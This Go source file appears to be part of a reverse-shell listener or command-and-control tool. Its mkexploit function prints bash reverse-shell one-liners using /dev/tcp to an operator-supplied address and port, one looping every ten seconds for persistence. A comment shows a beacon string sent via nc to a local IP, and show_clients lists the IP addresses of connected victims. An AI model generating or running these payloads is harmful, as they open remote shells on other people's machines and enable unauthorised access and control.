package main

import (
	"fmt"
)

func contains(s string, arr []string) bool {
	for _, v := range arr {
		if v == s {
			return true
		}
	}
	return false
}

func mkexploit(addr string, port string) string {
	return ``+Fore["GREEN"]+`Default:`+Fore["RESET"]+`
`+Fore["MAGENTA"]+`while`+Fore["RESET"]+` `+Fore["BLUE"]+`true`+Fore["RESET"]+`; `+Fore["BLUE"]+`do`+Fore["RESET"]+` `+Fore["BLUE"]+`bash`+Fore["RESET"]+` `+Fore["MAGENTA"]+`-c`+Fore["RESET"]+` `+Fore["YELLOW"]+`'bash -i >& /dev/tcp/`+addr+`/`+port+` 0>&1'`+Fore["RESET"]+`; `+Fore["BLUE"]+`sleep`+Fore["RESET"]+` `+Fore["GREEN"]+`10`+Fore["RESET"]+`; `+Fore["MAGENTA"]+`done`+Fore["RESET"]+` 

`+Fore["GREEN"]+`Single Connect:`+Fore["RESET"]+`
`+Fore["BLUE"]+`bash`+Fore["RESET"]+` `+Fore["MAGENTA"]+`-c`+Fore["RESET"]+` `+Fore["YELLOW"]+`'bash -i >& /dev/tcp/`+addr+`/`+port+` 0>&1'`+Fore["RESET"]+``

}

func get_char(c string, l int) string {
	var result string

	for i:=0;i<l;i++ {
		result+=c
	}

	return result
}

// echo "<venom>|127.0.0.1|FR|WIN11|89437284372" | nc 192.168.178.175 13000
func show_clients() {
	fmt.Println(Fore["GREEN"]+"IPAddress"+Fore["RESET"])
	
	for i:=0;i<len(Clients);i++ {
		// fmt.Println("| "+Clients[i].IPAddress+get_char(" ", 15 - len(Clients[i].IPAddress))+" |")
		fmt.Println(Fore["BLUE"]+Clients[i].IPAddress+Fore["RESET"])
	}

	if len(Clients) == 0 {
		fmt.Println(Fore["BLUE"]+"None"+Fore["RESET"])
	}

	fmt.Printf("\n")
}